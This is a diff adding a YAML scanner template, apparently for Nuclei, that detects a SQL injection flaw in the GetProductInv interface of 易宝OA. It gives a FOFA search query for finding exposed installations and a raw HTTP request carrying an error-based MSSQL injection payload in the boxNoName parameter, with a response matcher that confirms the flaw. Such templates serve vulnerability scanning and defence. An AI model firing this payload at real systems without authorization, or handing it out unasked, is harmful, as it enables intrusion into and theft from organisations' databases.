@@ -1,0 +1,46 @@
+id: yibaoOA-GetProductInv-sqli
+
+info:
+  name: 易宝OA-GetProductInv-SQL注入漏洞
+  author: candada
+  severity: high
+  description: '易宝OA是一款功能非常强大的办公软件。用户通过软件里可以轻松的进行移动办公，功能非常的丰富，可以满足用户的各种办公需求，让你的办公效率有了有效的提高，通过软件里可以轻松的解决用户的各种办公事项。易宝OA GetProductInv接口存在SQL注入漏洞。'
+  reference:
+    - https://mp.weixin.qq.com/s/3QFDouDmIr4kRqLqwy-ABA
+  tags: 2024,易宝OA,sqli
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="顶讯科技-易宝OA系统"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:
+    epss-percentile:
+    cpe:
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(97)%2bCHAR(98)%2bCHAR(99)%2bCHAR(100)%2bCHAR(101)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(102)%20ELSE%20CHAR(103)%20END))%2bCHAR(103)%2bCHAR(104)%2bCHAR(105)%2bCHAR(106)%2bCHAR(107)))--+YyAm&positionName=2&productID=3&opeID=4 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+       - 'abcdefghijk'
+      condition: and
+
+
+# Generated From WebFuzzer on 2024-04-28 15:20:40
